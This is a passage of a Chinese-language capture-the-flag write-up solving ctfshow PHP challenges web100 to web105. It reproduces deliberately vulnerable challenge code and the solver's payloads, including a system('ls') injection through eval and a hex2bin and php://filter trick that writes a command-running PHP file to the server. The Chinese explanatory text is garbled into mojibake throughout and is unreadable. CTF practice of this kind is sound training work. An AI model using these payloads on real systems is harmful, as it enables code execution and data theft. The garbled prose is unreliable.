</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">\# @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;ctfshow.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1">//flag in class ctfshow;
</span></span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="c1"></span><span class="nv">$ctfshow</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ctfshow</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="nv">$v1</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="nv">$v2</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="nv">$v3</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v3&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="nv">$v0</span><span class="o">=</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v1</span><span class="p">)</span> <span class="k">and</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v2</span><span class="p">)</span> <span class="k">and</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v3</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$v0</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;/&#34;</span><span class="p">,</span> <span class="nv">$v2</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;/&#34;</span><span class="p">,</span> <span class="nv">$v3</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">      <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$v2</span><span class="s2">(&#39;ctfshow&#39;)</span><span class="si">$v3</span><span class="s2">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">  
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">
</span></span><span class="line"><span class="ln">30</span><span class="cl">
</span></span><span class="line"><span class="ln">31</span><span class="cl">
</span></span><span class="line"><span class="ln">32</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>è¿™é¢˜å…¶å®å°±æ˜¯ä¸€é“ç®€å•çš„æ‹¼æ¥é¢˜</p>
<pre tabindex="0"><code>$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
</code></pre><p>è¿™é‡Œçœ‹èµ·æ¥åƒæ˜¯è¦æ±‚v1ï¼Œv2ï¼Œv3éƒ½ä¸ºæ•°å­—ï¼Œå®é™…ä¸Šåªéœ€v1ä¸ºæ•°å­—åˆ™ä¼šå°†v1èµ‹ç»™v0ï¼Œè€Œä¸ä¼šå†æ‰§è¡Œåé¢çš„è¯­å¥</p>
<p>æ‰€ä»¥æˆ‘ä»¬è¿™é‡Œåªéœ€è¦ä½¿v1ä¸ºæ•°å­—å³å¯</p>
<p>payload:</p>
<pre tabindex="0"><code>?v1=21&amp;v2=var_dump($ctfshow)/*&amp;v3=*/;
</code></pre><p>æˆ–è€…ç”¨å‘½ä»¤</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cobol" data-lang="cobol"><span class="line"><span class="ln">1</span><span class="cl"><span class="c">?v1=1&amp;</span><span class="nv">v2</span><span class="o">=</span><span class="nv">system</span><span class="p">(</span><span class="s1">&#39;ls&#39;</span><span class="p">)</span><span class="o">/*</span><span class="p">&amp;</span><span class="nv">v3</span><span class="o">=*/</span><span class="p">;</span><span class="err">
</span></span></span></code></pre></div><p><img alt="image-20241202145637866" loading="lazy" src="assets/image-20241202145637866.png"></p>
<p>å°†0x2dæ›´æ¢æˆ-å¾—åˆ°flag</p>
<h4 id="web101">web101<a hidden class="anchor" aria-hidden="true" href="#web101">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-22 00:26:48
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;ctfshow.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1">//flag in class ctfshow;
</span></span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="c1"></span><span class="nv">$ctfshow</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ctfshow</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="nv">$v1</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="nv">$v2</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="nv">$v3</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v3&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="nv">$v0</span><span class="o">=</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v1</span><span class="p">)</span> <span class="k">and</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v2</span><span class="p">)</span> <span class="k">and</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v3</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$v0</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/</span><span class="se">\\\\</span><span class="s2">|\/|\~|\`|\!|\@|\#|</span><span class="se">\\</span><span class="s2">$|\%|\^|\*|\)|\-|\_|\+|\=|\{|\[|</span><span class="se">\&#34;</span><span class="s2">|\&#39;|\,|\.|\;|\?|[0-9]/&#34;</span><span class="p">,</span> <span class="nv">$v2</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/</span><span class="se">\\\\</span><span class="s2">|\/|\~|\`|\!|\@|\#|</span><span class="se">\\</span><span class="s2">$|\%|\^|\*|\(|\-|\_|\+|\=|\{|\[|</span><span class="se">\&#34;</span><span class="s2">|\&#39;|\,|\.|\?|[0-9]/&#34;</span><span class="p">,</span> <span class="nv">$v3</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$v2</span><span class="s2">(&#39;ctfshow&#39;)</span><span class="si">$v3</span><span class="s2">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">    
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">
</span></span><span class="line"><span class="ln">30</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>é¢˜ç›®æè¿°:ä¿®è¡¥100é¢˜éé¢„æœŸ,æ›¿æ¢0x2d</p>
<p>ä¿®è¡¥äº†ä¸Šä¸€é¢˜é€šè¿‡ç›´æ¥å‘½ä»¤æ‰§è¡Œæˆ–è€…var_dumpæ‰“å°ç±»çš„æ–¹æ³•</p>
<p>æˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨åå°„ç±»çš„æ–¹æ³•ï¼Œåˆ©ç”¨é¢˜ç›®ç»™å‡ºçš„<code>('ctfshow')</code>æ¥æ‹¼æ¥æ‰“å°ç±»</p>
<p>payload:</p>
<pre tabindex="0"><code>?v1=1&amp;v2=echo new Reflectionclass&amp;v3=;
</code></pre><p><img alt="image-20241202152406295" loading="lazy" src="assets/image-20241202152406295.png"></p>
<p>è¿™é“é¢˜çš„flagå°‘äº†ä¸€ä½ï¼Œåœ¨å¾—åˆ°çš„flagåœ¨æ›¿æ¢æ‰0x2dåï¼Œå†è¿›è¡Œçˆ†ç ´å³å¯å¾—åˆ°flag</p>
<p>payload:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="s2">&#34;fa2a169a0x2da0820x2d40f30x2da5cd0x2d65ce0d29b42&#34;</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="n">b</span> <span class="o">=</span> <span class="n">a</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;0x2d&#34;</span><span class="p">,</span><span class="s2">&#34;-&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="nb">hex</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;1&#34;</span><span class="p">,</span><span class="s2">&#34;2&#34;</span><span class="p">,</span><span class="s2">&#34;3&#34;</span><span class="p">,</span><span class="s2">&#34;4&#34;</span><span class="p">,</span><span class="s2">&#34;5&#34;</span><span class="p">,</span><span class="s2">&#34;6&#34;</span><span class="p">,</span><span class="s2">&#34;7&#34;</span><span class="p">,</span><span class="s2">&#34;8&#34;</span><span class="p">,</span><span class="s2">&#34;9&#34;</span><span class="p">,</span><span class="s2">&#34;a&#34;</span><span class="p">,</span><span class="s2">&#34;b&#34;</span><span class="p">,</span><span class="s2">&#34;c&#34;</span><span class="p">,</span><span class="s2">&#34;d&#34;</span><span class="p">,</span><span class="s2">&#34;e&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">hex</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;ctfshow{&#34;</span><span class="o">+</span><span class="n">b</span><span class="o">+</span><span class="n">i</span><span class="o">+</span><span class="s2">&#34;}&#34;</span><span class="p">)</span>
</span></span></code></pre></div><h4 id="web102">web102<a hidden class="anchor" aria-hidden="true" href="#web102">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: atao
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-23 20:59:43
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nv">$v1</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nv">$v2</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="nv">$v3</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v3&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="nv">$v4</span> <span class="o">=</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v2</span><span class="p">)</span> <span class="k">and</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v3</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$v4</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nv">$s</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$v2</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="nv">$str</span> <span class="o">=</span> <span class="nx">call_user_func</span><span class="p">(</span><span class="nv">$v1</span><span class="p">,</span><span class="nv">$s</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">echo</span> <span class="nv">$str</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$v3</span><span class="p">,</span><span class="nv">$str</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;hacker&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">
</span></span><span class="line"><span class="ln">28</span><span class="cl">
</span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>åˆ†æä¸€ä¸‹è¿™æ®µä»£ç </p>
<p>é¦–å…ˆè¿™æ®µä»£ç ä¼šæ¥æ”¶ä¸‰ä¸ªå‚æ•°v1,v2,v3</p>
<p>æ ¹æ®phpçš„ç‰¹æ€§ï¼Œå½“$v2ä¸ºæ•°å­—æ—¶$v4å°±ä¼šè¢«èµ‹å€¼ä¸º1ï¼Œè€Œä¸$v3çš„å€¼æ— å…³</p>
<p>æ‰€ä»¥æƒ³è¦è¿›å…¥åˆ¤æ–­ï¼Œæˆ‘ä»¬é¦–å…ˆè¦ä½¿v2ä¸ºæ•°å­—</p>
<p>æ¥ç€ä¼šé€šè¿‡substrå¯¹v2å‰ä¸¤æ®µè¿›è¡Œæˆªæ–­å¹¶èµ‹å€¼ç»™s</p>
<p>ä¸‹ä¸€æ­¥å°±ä¼šå°†v1å’Œséƒ½ä¼ å…¥call_user_funcå‡½æ•°</p>
<p><strong>call_user_funcå‡½æ•°æœ‰ä»€ä¹ˆç”¨å‘¢?</strong></p>
<p><code>call_user_func</code> æ˜¯ PHP ä¸­çš„ä¸€ä¸ªå†…ç½®å‡½æ•°ï¼Œå®ƒçš„ä¸»è¦ä½œç”¨æ˜¯è°ƒç”¨å›è°ƒå‡½æ•°ã€‚</p>
<pre tabindex="0"><code>function greet($name) {
    return &#34;Hello, $name!&#34;;
}

$message = call_user_func(&#39;greet&#39;, &#39;John&#39;);
echo $message; 
</code></pre><p>æˆ‘ä»¬å…ˆä¸ç®¡ä»–æ€ä¹ˆåˆ©ç”¨ï¼Œæ¥ç€å¾€ä¸‹çœ‹</p>
<p>æœ€åä¼šè°ƒç”¨file_put_contentså‡½æ•°ï¼Œé‚£æ€è·¯å°±å¾ˆæ˜æ˜¾äº†ï¼Œæˆ‘ä»¬é€šè¿‡å†™æ–‡ä»¶æ¥æ‹¿åˆ°flag</p>
<p>ä½†æ˜¯æˆ‘ä»¬è¦å°†v2è¿™ä¸€ä¸²æ•°å­—ç»è¿‡ä¸€ç³»åˆ—è½¬æ¢åå†™å…¥æ–‡ä»¶å¹¶æ‰§è¡Œè¦æ€ä¹ˆåšå‘¢ï¼Ÿ</p>
<p>å‡å¦‚è¯´æˆ‘ä»¬å¯ä»¥å°†phpä»£ç è½¬æ¢æˆbase64åå†è½¬æ¢æˆhexï¼Œè€Œå¾—åˆ°çš„hexåˆåˆšå¥½ä¸ºæ•°å­—ï¼Œé‚£æˆ‘ä»¬å°±èƒ½å®ç°æˆ‘ä»¬çš„ç›®æ ‡ã€‚</p>
<p><strong>é‚£æ€ä¹ˆè¿›è¡Œæ ¼å¼è½¬æ¢å‘¢?</strong></p>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡call_user_funcå‡½æ•°è°ƒç”¨phpçš„å†…ç½®ç±»hex2binï¼Œå°†æˆ‘ä»¬ä¼ å…¥çš„v2è½¬æ¢å›base64ç¼–ç ï¼Œæ¥ç€åœ¨å†™æ–‡ä»¶çš„æ—¶å€™ï¼Œå†é€šè¿‡phpä¼ªåè®®çš„æ–¹å¼å°†base64å…ˆè½¬æ¢ä¸ºæˆ‘ä»¬çš„ä»£ç å†å†™å…¥æ–‡ä»¶ã€‚</p>
<p>ç»è¿‡å°è¯•æˆ‘ä»¬å¯ä»¥å¾—åˆ°ç¬¦åˆæ¡ä»¶çš„ä»£ç </p>
<pre tabindex="0"><code>&lt;?=`cat *`;
base64:PD89YGNhdCAqYDs= (è½¬hexå»æ‰=)
hex:5044383959474E6864434171594473
</code></pre><p>æˆ‘ä»¬éœ€è¦åœ¨hexå‰é¢éšä¾¿åŠ ä¸¤ä½æ•°å­—æ¥ç»•è¿‡æˆªæ–­</p>
<p>payload:</p>
<pre tabindex="0"><code>v1=hex2bin
v2=665044383959474E6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php
</code></pre><h4 id="web103">web103<a hidden class="anchor" aria-hidden="true" href="#web103">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: atao
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-23 21:03:24
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nv">$v1</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nv">$v2</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="nv">$v3</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v3&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="nv">$v4</span> <span class="o">=</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v2</span><span class="p">)</span> <span class="k">and</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v3</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$v4</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nv">$s</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$v2</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="nv">$str</span> <span class="o">=</span> <span class="nx">call_user_func</span><span class="p">(</span><span class="nv">$v1</span><span class="p">,</span><span class="nv">$s</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">echo</span> <span class="nv">$str</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/.*p.*h.*p.*/i&#34;</span><span class="p">,</span><span class="nv">$str</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$v3</span><span class="p">,</span><span class="nv">$str</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Sorry&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;hacker&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">
</span></span><span class="line"><span class="ln">33</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>è¿™é¢˜ç›¸æ¯”ä¸Šä¸€é¢˜å¤šäº†ä¸€ä¸ªè¿‡æ»¤</p>
<pre tabindex="0"><code>if(!preg_match(&#34;/.*p.*h.*p.*/i&#34;,$str)){
        file_put_contents($v3,$str);
    }
    else{
        die(&#39;Sorry&#39;);
    }
</code></pre><p>ç»§ç»­ç”¨ä¸Šé¢˜çš„æ–¹æ³•å³å¯</p>
<p>payload:</p>
<pre tabindex="0"><code>v1=hex2bin
v2=665044383959474E6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php
</code></pre><h4 id="web104">web104<a hidden class="anchor" aria-hidden="true" href="#web104">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: atao
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-28 22:27:20
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nv">$v1</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="nv">$v2</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">sha1</span><span class="p">(</span><span class="nv">$v1</span><span class="p">)</span><span class="o">==</span><span class="nx">sha1</span><span class="p">(</span><span class="nv">$v2</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">
</span></span><span class="line"><span class="ln">24</span><span class="cl">
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>ä½¿v1=v2å³å¯</p>
<pre tabindex="0"><code>v1=1
v2=1
</code></pre><h4 id="web105">web105<a hidden class="anchor" aria-hidden="true" href="#web105">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Firebasky
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-28 22:34:07
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
